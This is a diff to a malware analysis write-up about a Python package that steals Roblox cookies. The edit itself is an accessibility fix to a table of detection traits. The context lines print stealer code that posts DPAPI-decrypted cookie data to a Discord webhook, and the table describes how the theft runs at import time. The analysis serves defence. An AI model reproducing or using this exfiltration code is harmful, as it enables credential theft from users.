@@ -42,14 +42,14 @@ requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"
 requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: clear.<span class="tok-fn">decode</span>(<span class="tok-str">"utf-8"</span>, errors=<span class="tok-str">"ignore"</span>)})
 </code></pre>
 
-| | Trait | What it caught |
+| <span class="visually-hidden">Severity</span> | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/platform` | Reads Roblox's local cookie store `robloxcookies.dat` |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/dpapi` | DPAPI-decrypted secret posted to a Discord webhook |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/channel/messaging` | Hardcoded `discord.com/api/webhooks/...` URL |
-| <span class="sev-dot notable" title="notable"></span> | `objectives/credential-access/browser/dpapi` | `win32crypt.CryptUnprotectData` on the decoded blob |
-| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/data/control-flow/module-exec` | Import-time call silenced by try/except |
-| <span class="sev-dot notable" title="notable"></span> | `objectives/anti-static/obfuscation/code-metrics/source` | Russian comments trip the non-ASCII ratio |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/exfiltration/stealer/credential/platform` | Reads Roblox's local cookie store `robloxcookies.dat` |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/exfiltration/stealer/credential/dpapi` | DPAPI-decrypted secret posted to a Discord webhook |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/command-and-control/channel/messaging` | Hardcoded `discord.com/api/webhooks/...` URL |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `objectives/credential-access/browser/dpapi` | `win32crypt.CryptUnprotectData` on the decoded blob |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `micro-behaviors/data/control-flow/module-exec` | Import-time call silenced by try/except |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `objectives/anti-static/obfuscation/code-metrics/source` | Russian comments trip the non-ASCII ratio |
 
 There's no persistence, no second stage, and no obfuscation past the try/except — just a stickup that works because the mark came for a shortcut and was never going to open `__init__.py`.
 
